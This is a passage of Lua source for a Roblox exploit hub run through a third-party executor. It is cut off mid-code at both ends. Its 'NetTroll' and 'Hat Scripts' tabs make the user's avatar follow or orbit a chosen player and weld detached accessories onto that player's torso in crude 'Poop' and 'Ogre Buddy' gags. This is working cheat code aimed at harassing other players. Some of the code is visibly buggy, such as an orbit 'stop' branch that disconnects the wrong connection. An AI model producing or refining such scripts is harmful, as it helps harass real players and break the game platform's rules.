    local targetPlayer = findTargetPlayer(targetPlayerPartialName)
    if targetPlayer then
        local targetCharacter = targetPlayer.Character
        if targetCharacter then
            local targetRoot = targetCharacter:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                local character = player.Character
                if character then
                    local rootPart = character:FindFirstChild("HumanoidRootPart")
                    if rootPart then
                        -- Create or update BodyPosition and BodyGyro
                        if not bodyPosition then
                            bodyPosition = rootPart:FindFirstChildOfClass("BodyPosition") or Instance.new("BodyPosition", rootPart)
                            bodyPosition.MaxForce = Vector3.new(4000, 4000, 4000)
                            bodyPosition.P = 20000  -- Increase proportional gain for faster response
                            bodyPosition.D = 1000   -- Increase derivative gain for smoother response
                        end
                        if not bodyGyro then
                            bodyGyro = rootPart:FindFirstChildOfClass("BodyGyro") or Instance.new("BodyGyro", rootPart)
                            bodyGyro.MaxTorque = Vector3.new(4000, 4000, 4000)
                            bodyGyro.P = 20000      -- Increase proportional gain for faster response
                            bodyGyro.D = 1000       -- Increase derivative gain for smoother response
                        end

                        -- Calculate target position and orientation
                        local targetPosition = targetRoot.Position + targetRoot.CFrame.LookVector * -behindDistance + Vector3.new(0, followDistance, 0)
                        local targetOrientation = CFrame.new(targetRoot.Position, targetRoot.Position + targetRoot.CFrame.LookVector)

                        -- Update BodyPosition and BodyGyro
                        bodyPosition.Position = targetPosition
                        bodyGyro.CFrame = targetOrientation
                    end
                end
            end
        end
    end
end

-- Connect the followTarget function to RenderStepped
local followConnection
followConnection = RunService.RenderStepped:Connect(followTarget)

-- Store the connection in a global variable to access it in the stop script
getgenv().followConnection = followConnection



        
        else
game.Players.LocalPlayer.Character.Humanoid.Sit = false
-- Execute this in your executor to stop following
local RunService = game:GetService("RunService")

local function stopFollowing()
    -- Access the stored connection and disconnect it
    if getgenv().followConnection then
        getgenv().followConnection:Disconnect()
        getgenv().followConnection = nil
    end

    -- Remove BodyPosition and BodyGyro to reset character physics
    local player = game:GetService("Players").LocalPlayer
    local character = player.Character
    if character then
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if rootPart then
            local bodyPosition = rootPart:FindFirstChild("BodyPosition")
            local bodyGyro = rootPart:FindFirstChild("BodyGyro")
            if bodyPosition then bodyPosition:Destroy() end
            if bodyGyro then bodyGyro:Destroy() end
        end
    end
end

stopFollowing()




        end
     end
}

local orbrad = 5

NetTrollTab:Toggle{
	Name = "Orbit",
	StartingState = false,
	Description = nil,
	Callback = function(state) 
    if (state) == true then
-- Execute this in your executor to start orbiting around the player
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local targetPlayerPartialName = pigvicval  -- Replace with the partial name of the player to orbit around
local orbitRadius = orbrad  -- Radius of the orbit circle
local orbitHeight = 3  -- Height above the target player

-- Function to find target player by partial name
local function findTargetPlayer(partialName)
    for _, targetPlayer in pairs(Players:GetPlayers()) do
        if string.match(string.lower(targetPlayer.Name), string.lower(partialName)) then
            return targetPlayer
        end
    end
    return nil
end

-- Create variables to hold BodyPosition and BodyGyro instances
local bodyPosition
local bodyGyro

local function orbitTarget()
    local targetPlayer = findTargetPlayer(targetPlayerPartialName)
    if targetPlayer then
        local targetCharacter = targetPlayer.Character
        if targetCharacter then
            local targetRoot = targetCharacter:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                local character = player.Character
                if character then
                    local rootPart = character:FindFirstChild("HumanoidRootPart")
                    if rootPart then
                        -- Create or update BodyPosition and BodyGyro
                        orbitRadius = orbrad
                        if not bodyPosition then
                            bodyPosition = rootPart:FindFirstChildOfClass("BodyPosition") or Instance.new("BodyPosition", rootPart)
                            bodyPosition.MaxForce = Vector3.new(4000, 4000, 4000)
                            bodyPosition.P = 20000  -- Increase proportional gain for faster response
                            bodyPosition.D = 1000   -- Increase derivative gain for smoother response
                        end
                        if not bodyGyro then
                            bodyGyro = rootPart:FindFirstChildOfClass("BodyGyro") or Instance.new("BodyGyro", rootPart)
                            bodyGyro.MaxTorque = Vector3.new(4000, 4000, 4000)
                            bodyGyro.P = 20000      -- Increase proportional gain for faster response
                            bodyGyro.D = 1000       -- Increase derivative gain for smoother response
                        end

                        -- Calculate orbit position relative to the target
                        local offset = Vector3.new(math.cos(tick() * 2) * orbitRadius, orbitHeight, math.sin(tick() * 2) * orbitRadius)
                        local targetPosition = targetRoot.Position + offset

                        -- Update BodyPosition and BodyGyro
                        orbitRadius = orbrad
                        bodyPosition.Position = targetPosition
                        bodyGyro.CFrame = CFrame.lookAt(targetPosition, targetRoot.Position)
                    end
                end
            end
        end
    end
end

-- Connect the orbitTarget function to RenderStepped
local orbitConnection
orbitConnection = RunService.RenderStepped:Connect(orbitTarget)

-- Store the connection in a global variable to access it in the stop script
getgenv().orbitConnection = orbitConnection

        else
-- Execute this in your executor to stop following
local RunService = game:GetService("RunService")

local function stopFollowing()
    -- Access the stored connection and disconnect it
    if getgenv().followConnection then
        getgenv().followConnection:Disconnect()
        getgenv().followConnection = nil
    end

    -- Remove BodyPosition and BodyGyro to reset character physics
    local player = game:GetService("Players").LocalPlayer
    local character = player.Character
    if character then
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if rootPart then
            local bodyPosition = rootPart:FindFirstChild("BodyPosition")
            local bodyGyro = rootPart:FindFirstChild("BodyGyro")
            if bodyPosition then bodyPosition:Destroy() end
            if bodyGyro then bodyGyro:Destroy() end
        end
    end
end

stopFollowing()
        end
    end
}

NetTrollTab:Slider{
	Name = "Orbit Radius",
	Default = 5,
	Min = 1,
	Max = 50,
	Callback = function(Value)
    orbrad = (Value)
     end
}

NetTrollTab:Button{
	Name = "Poop",
	Description = "Makes them poop using death method.",
	Callback = function()
    getgenv().Target = pigvicval; -- Player user or shorten --
local tog = true
local move = false
local jit = Vector3.new(25.01, 0, 0)
local Player = game:GetService("Players").LocalPlayer
local Character = Player.Character

function GS(serv) return game:GetService(serv) end
local plrs, RunService = GS("Players"), GS("RunService")
local plr = plrs.LocalPlayer
local Loop

function GetPlayer(str)
    local Found
    for i, v in pairs(plrs:GetPlayers()) do
        if v.Name:lower():find(str:lower()) then
            Found = v
            break
        end
    end
    return Found
end

local targetplayer = GetPlayer(Target)
if not targetplayer then
    warn("Target player not found")
    return
end

local targetplayerc = targetplayer.Character
local targetwc = game.Workspace:FindFirstChild(targetplayer.Name)
if not targetwc then
    warn("Target player's workspace not found")
    return
end

RunService.Heartbeat:Connect(function()
    Character["Poop"].Handle.Velocity = jit
end)

local Head = "Poop" -- press f9 and find the hat that looks like a head's name and put it here
local x = 0   -- Edit Position for head n +left and -Right
local y = -1.2   -- Edit Position for head up and down
local z = 0.2 -- Edit Position for head x3

Character:WaitForChild(Head).Handle.AccessoryWeld:Remove()

local alignpos = Instance.new("AlignPosition", Character)
local alignorien = Instance.new("AlignOrientation", Character)
local att1 = Instance.new("Attachment", Character:WaitForChild(Head).Handle)
local att2 = Instance.new("Attachment", targetwc:WaitForChild("Torso"))

alignpos.Attachment0 = att1
alignpos.Attachment1 = att2
alignpos.RigidityEnabled = false
alignpos.ReactionForceEnabled = false
alignpos.ApplyAtCenterOfMass = true
alignpos.MaxForce = 99999999
alignpos.MaxVelocity = math.huge
alignpos.Responsiveness = 200

alignorien.Attachment0 = att1
alignorien.Attachment1 = att2
alignorien.ReactionTorqueEnabled = false
alignorien.PrimaryAxisOnly = false
alignorien.MaxTorque = 99999999
alignorien.MaxAngularVelocity = math.huge
alignorien.Responsiveness = 200

att2.Position = Vector3.new(x, y, z)

Character:WaitForChild(Head).Handle.Attachment.Rotation = Vector3.new(120, 180, 0)


local MusicOnHat = false -- If You Want To Play Audio In Hat
local StartSound = Instance.new("Sound")
StartSound.SoundId = "rbxassetid://8548558777" -- place sound id here
StartSound.Volume = 0.1

-- Script to grab and store the player's current position
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Store the current position
local currentPosition = character.HumanoidRootPart.Position

-- Print the stored position (optional)
print("Current Position:", currentPosition)




StartSound.Parent = workspace:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart

local YEET = Instance.new("Sound")
YEET.SoundId = "rbxassetid://525743689" -- place sound id here
YEET.Volume = 1



YEET.Parent = workspace:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart


StartSound:Play()

local tpbackpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame


game.Players.LocalPlayer.Character.Humanoid.Health = 0

wait(1)
StartSound:Play()
att2.Position = Vector3.new(0, -1.2, 0.3)

wait(0.1)
StartSound:Play()
att2.Position = Vector3.new(0, -1.3, 0.4)

wait(0.1)
StartSound:Play()
att2.Position = Vector3.new(0, -1.4, 0.5)

wait(0.1)
StartSound:Play()
att2.Position = Vector3.new(0, -1.5, 0.6)

wait(0.1)
StartSound:Play()
att2.Position = Vector3.new(0, -1.6, 0.7)

local player = game.Players.LocalPlayer

-- Function to detect when the player respawns
local function onCharacterAdded(character)

    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = tpbackpos
end

-- Connect the function to the CharacterAdded event
player.CharacterAdded:Connect(onCharacterAdded)

-- Check if the player already has a character (in case they start alive)
if player.Character then
    onCharacterAdded(player.Character)
end

     end
}





--HAT SCRIPTS





local HatTab = GUI:Tab{
	Name = "Hat Scripts",
	Icon = "http://www.roblox.com/asset/?id=11306217943"
}



HatTab:Button{
	Name = "Ogre Buddy [R6]",
	Description = nil,
	Callback = function()
    local function GetPlayerByPartialName(partialName)
    local players = game:GetService("Players"):GetPlayers()
    for _, player in ipairs(players) do
        if player.Name:lower():find(partialName:lower()) then
            return player
        end
    end
    return nil
end

-- Define the partial name you are looking for
local partialName = pigvicval -- Change this to the partial name you're looking for

-- Get the player by partial name
local foundPlayer = GetPlayerByPartialName(partialName)

-- Check if a player was found and print the full name
if foundPlayer then
    print("Full name of the player found: " .. foundPlayer.Name)
else
    print("Player not found with the partial name: " .. partialName)
end




getgenv().Target = foundPlayer.Name
	local tog = true
	local move = false
	local jit = Vector3.new(25.01,0,0)
	local Player = game:GetService("Players").LocalPlayer
	local Character = Player.Character

	function GS(serv) return game:GetService(serv) end;
	local plrs, RunService = GS("Players"), GS("RunService");
	local plr = plrs.LocalPlayer;
	local Loop;

	--
	function GetPlayer(str)
		local Found;

		for i,v in pairs(plrs:GetPlayers()) do
			if v.Name:lower():find(str) then
				Found = v end end;
		return Found end;
	--

	local targetplayer = plrs[Target]
	local targetplayerc = Target.Character;
	local targetwc = game.Workspace[Target]

	game:GetService("RunService").Heartbeat:Connect(function()
		Character["Hat1"].Handle.Velocity = jit
		Character["Space Cop"].Handle.Velocity = jit
		Character["LavanderHair"].Handle.Velocity = jit
		Character["Pal Hair"].Handle.Velocity = jit
		Character["Pink Hair"].Handle.Velocity = jit
		Character["Ogre"].Handle.Velocity = jit
	end)

	local Head = "Ogre" --press f9 and find the hat that looks like a heads name and put it here
	local x = -0   --Edit Position for head n +left and -Right
	local y = -30   --Edit Position for head up and down
	local z = 1 --Edit Position for head x3

	local Hats = {rarm = Character:WaitForChild("Hat1"),
		larm = Character:WaitForChild("Pal Hair"),
		rleg = Character:WaitForChild("LavanderHair"),
		lleg  = Character:WaitForChild("Pink Hair"),
		belly   = Character:WaitForChild("Space Cop"),



	}

	for i,v in next, Hats do
		v.Handle.AccessoryWeld:Remove()
		for _,mesh in next, v:GetDescendants() do
			if mesh:IsA("Mesh") or mesh:IsA("SpecialMesh") then
				mesh:Remove()
			end
		end
	end

	local function align(i,v)
		local att0 = Instance.new("Attachment", i)
		att0.Position = Vector3.new(0,0,0)
		local att1 = Instance.new("Attachment", v)
		att1.Position = Vector3.new(0,0,0)
		local AP = Instance.new("AlignPosition", i)
		AP.Attachment0 = att0
		AP.Attachment1 = att1
		AP.RigidityEnabled = false
		AP.ReactionForceEnabled = false
		AP.ApplyAtCenterOfMass = true
		AP.MaxForce = 9999999
		AP.MaxVelocity = math.huge
		AP.Responsiveness = 200
		local AO = Instance.new("AlignOrientation", i)
		AO.Attachment0 = att0
		AO.Attachment1 = att1
		AO.ReactionTorqueEnabled = false
		AO.PrimaryAxisOnly = false
		AO.MaxTorque = 9999999
		AO.MaxAngularVelocity = math.huge
		AO.Responsiveness = 200
	end
	align(Hats.rarm.Handle, targetwc["Torso"])
	align(Hats.larm.Handle, targetwc["Torso"])
	align(Hats.rleg.Handle, targetwc["Torso"])
	align(Hats.lleg.Handle, targetwc["Torso"])
	align(Hats.belly.Handle, targetwc["Torso"])


	Hats.rarm.Handle.Attachment.Rotation = Vector3.new(180,90,0)
	Hats.larm.Handle.Attachment.Rotation = Vector3.new(-10,-50,0)
	Hats.rleg.Handle.Attachment.Rotation = Vector3.new(-10,50,0)
	Hats.lleg.Handle.Attachment.Rotation = Vector3.new(0,-25,0)
	Hats.belly.Handle.Attachment.Rotation = Vector3.new(0,25,0)



	targetwc:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment1"
	targetwc:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment2"
	targetwc:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment3"
	targetwc:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment4"
	targetwc:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment5"



	targetwc:WaitForChild("Torso").Attachment1.Position = Vector3.new(0,-50,1)
	targetwc:WaitForChild("Torso").Attachment2.Position = Vector3.new(-1.4,-50,0.6) --Left Arm
	targetwc:WaitForChild("Torso").Attachment3.Position = Vector3.new(1.4,-50,0.6) --Right Arm
	targetwc:WaitForChild("Torso").Attachment4.Position = Vector3.new(-1,-50,0.5)
	targetwc:WaitForChild("Torso").Attachment5.Position = Vector3.new(1,-50,6)



	Character:WaitForChild(Head).Handle.AccessoryWeld:Remove()
	local alignpos = Instance.new("AlignPosition", Character)
	local alignorien = Instance.new("AlignOrientation", Character)
	local att1 = Instance.new("Attachment", Character:WaitForChild(Head).Handle)
	local att2 = Instance.new("Attachment", targetwc:WaitForChild("Torso"))
	alignpos.Attachment0 = att1
	alignpos.Attachment1 = att2
	alignpos.RigidityEnabled = false
	alignpos.ReactionForceEnabled = false
	alignpos.ApplyAtCenterOfMass = true
	alignpos.MaxForce = 99999999
	alignpos.MaxVelocity = math.huge
	alignpos.Responsiveness = 200
	alignorien.Attachment0 = att1
	alignorien.Attachment1 = att2
	alignorien.ReactionTorqueEnabled = false
	alignorien.PrimaryAxisOnly = false
	alignorien.MaxTorque = 99999999
	alignorien.MaxAngularVelocity = math.huge
	alignorien.Responsiveness = 200
	att2.Position = Vector3.new(x,y,z)





    game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KeyPressed)
		if KeyPressed == "r" then
			if toggle == false then

				targetwc.Humanoid.WalkSpeed = 16

				targetwc.Humanoid.Sit = false

				targetwc.Torso.Anchored = false

				targetwc.Humanoid.HipHeight = 0
				targetwc:WaitForChild("Torso").Attachment1.Position = Vector3.new(0.40,-1.5,-3) --rarm
				targetwc:WaitForChild("Torso").Attachment2.Position = Vector3.new(-0.40,-1.5,-3) --larm
				targetwc:WaitForChild("Torso").Attachment3.Position = Vector3.new(0.60,-3,-2.5) --rleg
				targetwc:WaitForChild("Torso").Attachment4.Position = Vector3.new(-0.60,-3,-2.5) --lleg
				targetwc:WaitForChild("Torso").Attachment5.Position = Vector3.new(0,-1.5,-2.5) --belly



				Hats.rarm.Handle.Attachment.Rotation = Vector3.new(25,-55,0)
				Hats.rleg.Handle.Attachment.Rotation = Vector3.new(90,0,-20)
				Hats.lleg.Handle.Attachment.Rotation = Vector3.new(90,0,20)
				Hats.belly.Handle.Attachment.Rotation = Vector3.new(0,0,0)
				Hats.larm.Handle.Attachment.Rotation = Vector3.new(25,55,0)







				att2.Position = Vector3.new(0,0,-2.5)
				att2.Rotation = Vector3.new(0,0,0)
				toggle = true
			else
				targetwc.Humanoid.HipHeight = 0
				targetwc:WaitForChild("Torso").Attachment1.Position = Vector3.new(1,-1.5,-2.5) --rarm
				targetwc:WaitForChild("Torso").Attachment2.Position = Vector3.new(-1,-1.5,-2.5) --larm
				targetwc:WaitForChild("Torso").Attachment3.Position = Vector3.new(0.60,-3,-2.5) --rleg
				targetwc:WaitForChild("Torso").Attachment4.Position = Vector3.new(-0.60,-3,-2.5) --lleg
				targetwc:WaitForChild("Torso").Attachment5.Position = Vector3.new(0,-1.5,-2.5) --belly



				Hats.rarm.Handle.Attachment.Rotation = Vector3.new(90,90,-60)
				Hats.rleg.Handle.Attachment.Rotation = Vector3.new(90,0,-20)
				Hats.lleg.Handle.Attachment.Rotation = Vector3.new(90,0,20)
				Hats.belly.Handle.Attachment.Rotation = Vector3.new(0,0,0)
				Hats.larm.Handle.Attachment.Rotation = Vector3.new(90,90,60)







				att2.Position = Vector3.new(0,0,-2.5)
				att2.Rotation = Vector3.new(20,0,0)
				toggle = false
			end
		end
	end)

    game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KeyPressed)
		if KeyPressed == "e" then
			if toggle == false then

				targetwc.Humanoid.WalkSpeed = 16

				targetwc.Humanoid.Sit = false

				targetwc.Torso.Anchored = false

				targetwc.Humanoid.HipHeight = 0
				targetwc:WaitForChild("Torso").Attachment1.Position = Vector3.new(0,3.7,2) --rarm
				targetwc:WaitForChild("Torso").Attachment2.Position = Vector3.new(0,1.7,2) --larm
				targetwc:WaitForChild("Torso").Attachment3.Position = Vector3.new(0,0,2.5) --rleg
				targetwc:WaitForChild("Torso").Attachment4.Position = Vector3.new(0,-1.3,3.7) --lleg
				targetwc:WaitForChild("Torso").Attachment5.Position = Vector3.new(0,-1.6,4.5) --belly



				Hats.rarm.Handle.Attachment.Rotation = Vector3.new(90,0,0)
				Hats.rleg.Handle.Attachment.Rotation = Vector3.new(120,0,0)
				Hats.lleg.Handle.Attachment.Rotation = Vector3.new(170,0,0)
				Hats.belly.Handle.Attachment.Rotation = Vector3.new(0,0,0)
				Hats.larm.Handle.Attachment.Rotation = Vector3.new(90,0,0)







				att2.Position = Vector3.new(0,5,1)
				att2.Rotation = Vector3.new(-45,0,0)
				toggle = true
			else
				targetwc.Humanoid.HipHeight = 0
				targetwc:WaitForChild("Torso").Attachment1.Position = Vector3.new(1,-1.3,-3) --rarm
				targetwc:WaitForChild("Torso").Attachment2.Position = Vector3.new(-1,-1.5,-2.5) --larm
				targetwc:WaitForChild("Torso").Attachment3.Position = Vector3.new(0.60,-3,-2.5) --rleg
				targetwc:WaitForChild("Torso").Attachment4.Position = Vector3.new(-0.60,-3,-2.5) --lleg
				targetwc:WaitForChild("Torso").Attachment5.Position = Vector3.new(0,-1.5,-2.5) --belly



				Hats.rarm.Handle.Attachment.Rotation = Vector3.new(-15,10,0)
				Hats.rleg.Handle.Attachment.Rotation = Vector3.new(90,0,-20)
				Hats.lleg.Handle.Attachment.Rotation = Vector3.new(90,0,20)
				Hats.belly.Handle.Attachment.Rotation = Vector3.new(0,0,0)
				Hats.larm.Handle.Attachment.Rotation = Vector3.new(90,90,60)







				att2.Position = Vector3.new(0,0,-2.5)
				att2.Rotation = Vector3.new(20,0,0)
				toggle = false
			end
		end
	end)
     end
}

HatTab:Button{
	Name = "Kick The Buddy [R6]",
	Description = nil,
	Callback = function()
               -- Ensure the script waits until the game is fully loaded
repeat wait() until game:IsLoaded()

-- Services and variables
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Ensure the character is fully loaded
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local humanoid = character:WaitForChild("Humanoid")

-- Parts to move
local parts = {
    character:WaitForChild("Left Arm", 10),
    character:WaitForChild("Right Arm", 10),
    character:WaitForChild("Right Leg", 10)
}

-- Check if all parts are found
for _, part in ipairs(parts) do
    if not part then
        warn("Part not found")
        return
    end
end

-- Break the joints to allow direct CFrame manipulation
for _, part in ipairs(parts) do
    part:BreakJoints()
end

-- Function to update the CFrame of the parts
local function updatePartsPosition()
    local rootCFrame = humanoidRootPart.CFrame
    local positions = {
        CFrame.new(-1, -20, 0), -- Left Arm
        CFrame.new(1, -20, 0),  -- Right Arm
        CFrame.new(1, -20, 0)   -- Right Leg
    }

    for i, part in ipairs(parts) do
        part.CFrame = rootCFrame * positions[i]
    end

    -- Maintain the same HipHeight
    
end

-- Connect the update function to the Heartbeat event
RunService.Heartbeat:Connect(updatePartsPosition)

print("Script is running and updating the arms and legs position while maintaining HipHeight.")



GUI:Notification{
	Title = "LIMBO",
	Text = "Reanimating",
	Duration = 4,
	Callback = function() end
}

wait(4)


local tog = true
	local move = false
	local jit = Vector3.new(25.01,0,0)
	local Player = game:GetService("Players").LocalPlayer
	local Character = Player.Character

	game:GetService("RunService").Heartbeat:Connect(function()
		Character["Hat1"].Handle.Velocity = jit
		Character["Robloxclassicred"].Handle.Velocity = jit
        Character["Bedhead"].Handle.Velocity = jit
        Character["Kate Hair"].Handle.Velocity = jit
        Character["LongHairHeadBand Black"].Handle.Velocity = jit
		Character["LavanderHair"].Handle.Velocity = jit
		Character["Pal Hair"].Handle.Velocity = jit
		Character["Pink Hair"].Handle.Velocity = jit
        
		Character["Hyper Realistic Noob Head"].Handle.Velocity = jit
	end)

	local Head = "Hyper Realistic Noob Head" --press f9 and find the hat that looks like a heads name and put it here
	local x = -7   --Edit Position for head n +left and -Right
	local y = 1.7   --Edit Position for head up and down
	local z = 0 --Edit Position for head x3

	local Hats = {rarmp = Character:WaitForChild("Hat1"),
		larmp = Character:WaitForChild("Pal Hair"),
		rlegp  = Character:WaitForChild("Pink Hair"),
		torsok   = Character:WaitForChild("LongHairHeadBand Black"),
        larmk   = Character:WaitForChild("Robloxclassicred"),
        rlegk   = Character:WaitForChild("Kate Hair"),
        llegk   = Character:WaitForChild("Bedhead"),
        rarmk   = Character:WaitForChild("LavanderHair"),



	}

	for i,v in next, Hats do
		v.Handle.AccessoryWeld:Remove()
		for _,mesh in next, v:GetDescendants() do
			if mesh:IsA("Mesh") or mesh:IsA("SpecialMesh") then
				mesh:Remove()
			end
		end
	end

	local function align(i,v)
		local att0 = Instance.new("Attachment", i)
		att0.Position = Vector3.new(0,0,0)
		local att1 = Instance.new("Attachment", v)
		att1.Position = Vector3.new(0,0,0)
		local AP = Instance.new("AlignPosition", i)
		AP.Attachment0 = att0
		AP.Attachment1 = att1
		AP.RigidityEnabled = false
		AP.ReactionForceEnabled = false
		AP.ApplyAtCenterOfMass = true
		AP.MaxForce = 9999999
		AP.MaxVelocity = math.huge
		AP.Responsiveness = 200
		local AO = Instance.new("AlignOrientation", i)
		AO.Attachment0 = att0
		AO.Attachment1 = att1
		AO.ReactionTorqueEnabled = false
		AO.PrimaryAxisOnly = false
		AO.MaxTorque = 9999999
		AO.MaxAngularVelocity = math.huge
		AO.Responsiveness = 200
	end
	align(Hats.rarmp.Handle, Character["Torso"])
	align(Hats.larmp.Handle, Character["Torso"])
	align(Hats.rlegp.Handle, Character["Torso"])
	align(Hats.rarmk.Handle, Character["Torso"])
    align(Hats.larmk.Handle, Character["Torso"])
    align(Hats.rlegk.Handle, Character["Torso"])
    align(Hats.llegk.Handle, Character["Torso"])
	align(Hats.torsok.Handle, Character["Torso"])


	Hats.rarmp.Handle.Attachment.Rotation = Vector3.new(90,0,0)
				Hats.rlegp.Handle.Attachment.Rotation = Vector3.new(90,0,0)
				Hats.llegk.Handle.Attachment.Rotation = Vector3.new(90,0,5)
				Hats.torsok.Handle.Attachment.Rotation = Vector3.new(0,90,0)
				Hats.larmp.Handle.Attachment.Rotation = Vector3.new(90,0,0)
                Hats.rlegk.Handle.Attachment.Rotation = Vector3.new(90,0,-5)
				Hats.rarmk.Handle.Attachment.Rotation = Vector3.new(90,0,-10)
				Hats.larmk.Handle.Attachment.Rotation = Vector3.new(90,0,10)



	Character:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment1"
	Character:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment2"
	Character:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment3"
	Character:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment4"
	Character:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment5"
    Character:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment6"
    Character:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment7"
    Character:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment8"



	Character:WaitForChild("Torso").Attachment1.Position = Vector3.new(1.5,0,0) --right arm player
				Character:WaitForChild("Torso").Attachment2.Position = Vector3.new(-1.5,0,0)  --left arm player
				Character:WaitForChild("Torso").Attachment3.Position = Vector3.new(0.5,-2,0) --right leg player
				Character:WaitForChild("Torso").Attachment4.Position = Vector3.new(-5.5,0.2,0) --right arm buddy
				Character:WaitForChild("Torso").Attachment5.Position = Vector3.new(-8.5,0.2,0)  --left arm buddy
                Character:WaitForChild("Torso").Attachment6.Position = Vector3.new(-6.45,-2,0) --right leg buddy
				Character:WaitForChild("Torso").Attachment7.Position = Vector3.new(-7.55,-2,0) --left leg buddy
				Character:WaitForChild("Torso").Attachment8.Position = Vector3.new(-7,0,0) --torso buddy



	Character:WaitForChild(Head).Handle.AccessoryWeld:Remove()
	local alignpos = Instance.new("AlignPosition", Character)
	local alignorien = Instance.new("AlignOrientation", Character)
	local att1 = Instance.new("Attachment", Character:WaitForChild(Head).Handle)
	local att2 = Instance.new("Attachment", Character:WaitForChild("Torso"))
	alignpos.Attachment0 = att1
	alignpos.Attachment1 = att2
	alignpos.RigidityEnabled = false
	alignpos.ReactionForceEnabled = false
	alignpos.ApplyAtCenterOfMass = true
	alignpos.MaxForce = 99999999
	alignpos.MaxVelocity = math.huge
	alignpos.Responsiveness = 200
	alignorien.Attachment0 = att1
	alignorien.Attachment1 = att2
	alignorien.ReactionTorqueEnabled = false
	alignorien.PrimaryAxisOnly = false
	alignorien.MaxTorque = 99999999
	alignorien.MaxAngularVelocity = math.huge
	alignorien.Responsiveness = 200
	att2.Position = Vector3.new(x,y,z)

    


	game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KeyPressed)
		if KeyPressed == "q" then
			if toggle == false then

				Character.Humanoid.WalkSpeed = 16

				Character.Humanoid.Sit = false

				Character.Torso.Anchored = false

				Character.Humanoid.HipHeight = 0
				Character:WaitForChild("Torso").Attachment1.Position = Vector3.new(1.5,0,0) --right arm player
				Character:WaitForChild("Torso").Attachment2.Position = Vector3.new(-1.5,0,0)  --left arm player
				Character:WaitForChild("Torso").Attachment3.Position = Vector3.new(0.5,-2,0) --right leg player
				Character:WaitForChild("Torso").Attachment4.Position = Vector3.new(-5.5,0.2,0) --right arm buddy
				Character:WaitForChild("Torso").Attachment5.Position = Vector3.new(-8.5,0.2,0)  --left arm buddy
                Character:WaitForChild("Torso").Attachment6.Position = Vector3.new(-6.45,-2,0) --right leg buddy
				Character:WaitForChild("Torso").Attachment7.Position = Vector3.new(-7.55,-2,0) --left leg buddy
				Character:WaitForChild("Torso").Attachment8.Position = Vector3.new(-7,0,0) --torso buddy



					Hats.rarmp.Handle.Attachment.Rotation = Vector3.new(90,0,0)
				Hats.rlegp.Handle.Attachment.Rotation = Vector3.new(90,0,0)
				Hats.llegk.Handle.Attachment.Rotation = Vector3.new(90,0,5)
				Hats.torsok.Handle.Attachment.Rotation = Vector3.new(0,90,0)
				Hats.larmp.Handle.Attachment.Rotation = Vector3.new(90,0,0)
                Hats.rlegk.Handle.Attachment.Rotation = Vector3.new(90,0,-5)
				Hats.rarmk.Handle.Attachment.Rotation = Vector3.new(90,0,-10)
				Hats.larmk.Handle.Attachment.Rotation = Vector3.new(90,0,10)




print("Got here")


				att2.Position = Vector3.new(-7,1.7,0)
				att2.Rotation = Vector3.new(0,0,0)
				toggle = true
			else
				Character.Humanoid.HipHeight = 0
				Character:WaitForChild("Torso").Attachment1.Position = Vector3.new(1.5,0,0) --right arm player
				Character:WaitForChild("Torso").Attachment2.Position = Vector3.new(-1.5,0,0)  --left arm player
				Character:WaitForChild("Torso").Attachment3.Position = Vector3.new(0.5,-2,0) --right leg player
				Character:WaitForChild("Torso").Attachment4.Position = Vector3.new(-5.5,0.2,0) --right arm buddy
				Character:WaitForChild("Torso").Attachment5.Position = Vector3.new(-8.5,0.2,0)  --left arm buddy
                Character:WaitForChild("Torso").Attachment6.Position = Vector3.new(-6.45,-2,0) --right leg buddy
				Character:WaitForChild("Torso").Attachment7.Position = Vector3.new(-7.55,-2,0) --left leg buddy
				Character:WaitForChild("Torso").Attachment8.Position = Vector3.new(-7,0,0) --torso buddy



					Hats.rarmp.Handle.Attachment.Rotation = Vector3.new(90,0,0)
				Hats.rlegp.Handle.Attachment.Rotation = Vector3.new(90,0,0)
				Hats.llegk.Handle.Attachment.Rotation = Vector3.new(90,0,5)
				Hats.torsok.Handle.Attachment.Rotation = Vector3.new(0,90,0)
				Hats.larmp.Handle.Attachment.Rotation = Vector3.new(90,0,0)
                Hats.rlegk.Handle.Attachment.Rotation = Vector3.new(90,0,-5)
				Hats.rarmk.Handle.Attachment.Rotation = Vector3.new(90,0,-10)
				Hats.larmk.Handle.Attachment.Rotation = Vector3.new(90,0,10)







				att2.Position = Vector3.new(-7,1.7,0)
				att2.Rotation = Vector3.new(0,0,0)
				toggle = false
			end
		end
        end)

        

      game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KeyPressed)
		if KeyPressed == "e" then
			if toggle == false then

				Character.Humanoid.WalkSpeed = 16

				Character.Humanoid.Sit = false

				Character.Torso.Anchored = false

				Character.Humanoid.HipHeight = 0
				Character:WaitForChild("Torso").Attachment1.Position = Vector3.new(1,0.8,-2) --right arm player
